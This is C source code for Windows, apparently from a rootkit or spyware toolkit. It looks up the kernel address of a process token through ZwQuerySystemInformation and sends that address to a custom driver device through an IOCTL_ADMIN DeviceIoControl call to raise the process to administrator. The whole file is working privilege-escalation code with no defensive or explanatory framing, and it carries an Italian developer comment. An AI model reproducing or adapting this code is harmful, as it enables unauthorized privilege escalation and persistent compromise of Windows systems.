#include <windows.h>
#include "DriverAccess.h"

void *FindTokenObject(HANDLE Handle)
{
	ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation;
	LONG Status;
	DWORD *p;
	DWORD n = 0x1000;
	HMODULE hNtdll;
	PSYSTEM_HANDLE_INFORMATION hinfo;
	BYTE *Object;
	DWORD cpid;

	cpid = GetCurrentProcessId();
	hNtdll = GetModuleHandle("ntdll.dll");
	ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	if (!ZwQuerySystemInformation)
		return NULL;
	if ( !(p = (DWORD *)malloc(n)) )
		return NULL;
	while ( (Status=ZwQuerySystemInformation(SystemHandleInformation, p, n, 0)) == STATUS_INFO_LENGTH_MISMATCH ) {
		free(p);
		n*=2;
		if (!(p = (DWORD *)malloc(n)))
			return NULL;
	}
	if (Status != STATUS_SUCCESS) {
		free(p);
		return NULL;
	}
	hinfo = PSYSTEM_HANDLE_INFORMATION(p + 2);
	for (DWORD i = 0; i < *p; i++) {
		if (hinfo[i].ProcessId == cpid  && hinfo[i].Handle == (USHORT)Handle) {
			Object = (BYTE *)hinfo[i].Object;			
			free(p);
			return Object;
		}
	}

	free(p);
	return NULL;
}

BOOL GetAdmin(DWORD pid)
{
	HANDLE htoken;
	DWORD dummy;
	BYTE *Object;
	BOOL ret_val = FALSE;
	HANDLE hFile;
	HANDLE hProc;

	//hFile = CreateFile("\\\\.\\MSH4DEV1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
	hFile = CreateFile("\\\\.\\ABCxEFXH", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
	if ( hFile == INVALID_HANDLE_VALUE )
		return FALSE;

	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	// XXX Cosa torna OpenProcess quando fallisce?
	if (!hProc) {
		CloseHandle(hFile);
		return FALSE;
	}

	if (!OpenProcessToken(hProc, TOKEN_QUERY, &htoken)) {
		CloseHandle(hProc);
		CloseHandle(hFile);
		return FALSE;
	}
	
	Object = (BYTE *)FindTokenObject(htoken);

	if (Object) 
		ret_val = DeviceIoControl(hFile, IOCTL_ADMIN, &Object, sizeof(Object), NULL, 0, &dummy, NULL);	

	CloseHandle(htoken);
	CloseHandle(hProc);
	CloseHandle(hFile);
	return ret_val;
}
